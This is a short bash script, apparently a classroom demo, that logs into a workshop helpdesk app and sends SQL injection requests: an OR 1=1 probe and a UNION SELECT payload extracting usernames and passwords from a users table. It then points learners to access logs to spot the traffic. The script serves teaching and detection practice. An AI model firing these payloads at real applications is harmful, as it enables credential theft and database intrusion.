#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
DEMO_USER_AGENT="${DEMO_USER_AGENT:-InstructorSQLiDemo/1.0}"
source "$SCRIPT_DIR/demo-common.sh"
trap cleanup_demo_cookie EXIT

require_curl
login_to_helpdesk

demo_get "normal-search" "/search?q=invoice"
demo_get "sqli-probe" "/search?q=%27%20OR%201%3D1--"
demo_get "sqli-union" "/search?q=%27%20UNION%20SELECT%20id%2Cusername%7C%7C%27%3A%27%7C%7Cpassword%2Crole%2Cemail%2Cusername%20FROM%20users--"

echo "SQL injection demo complete. Review the matching group log, for example workshop-logs/group1/web/access.log, for /search entries from this source IP."
